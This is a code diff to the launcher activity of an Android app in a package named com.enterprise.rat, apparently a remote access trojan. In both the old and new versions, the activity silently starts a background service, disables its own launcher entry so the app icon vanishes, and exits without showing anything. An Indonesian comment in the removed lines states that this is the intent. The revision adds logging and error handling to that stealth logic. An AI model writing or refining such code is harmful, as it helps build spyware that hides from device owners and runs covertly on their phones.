@@ -5,39 +5,44 @@ import android.content.ComponentName;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Bundle;
+import android.util.Log;
 import com.enterprise.rat.services.MainService;
 
 public class MainActivity extends Activity {
-
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        
-        // Langsung eksekusi sembunyikan icon dan jalankan service tanpa UI
-        hideAppIcon();
+        Log.d("MainActivity", "onCreate");
+        setContentView(R.layout.activity_main);
         startMainService();
+        hideAppIcon();
         finish();
     }
 
     private void startMainService() {
-        Intent serviceIntent = new Intent(this, MainService.class);
-        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-            startForegroundService(serviceIntent);
-        } else {
-            startService(serviceIntent);
+        Intent intent = new Intent(this, MainService.class);
+        try {
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                startForegroundService(intent);
+            } else {
+                startService(intent);
+            }
+            Log.d("MainActivity", "Service started");
+        } catch (Exception e) {
+            Log.e("MainActivity", "start error", e);
         }
     }
 
     private void hideAppIcon() {
-        PackageManager pm = getPackageManager();
-        ComponentName componentName = new ComponentName(this, MainActivity.class);
-        pm.setComponentEnabledSetting(componentName,
-            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            PackageManager.DONT_KILL_APP);
-
-        ComponentName alias = new ComponentName(this, "com.enterprise.rat.MainActivityAlias");
-        pm.setComponentEnabledSetting(alias,
-            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            PackageManager.DONT_KILL_APP);
+        try {
+            PackageManager pm = getPackageManager();
+            ComponentName mainComponent = new ComponentName(this, MainActivity.class);
+            pm.setComponentEnabledSetting(mainComponent,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP);
+            Log.d("MainActivity", "Icon hidden");
+        } catch (Exception e) {
+            Log.e("MainActivity", "hide error", e);
+        }
     }
 }
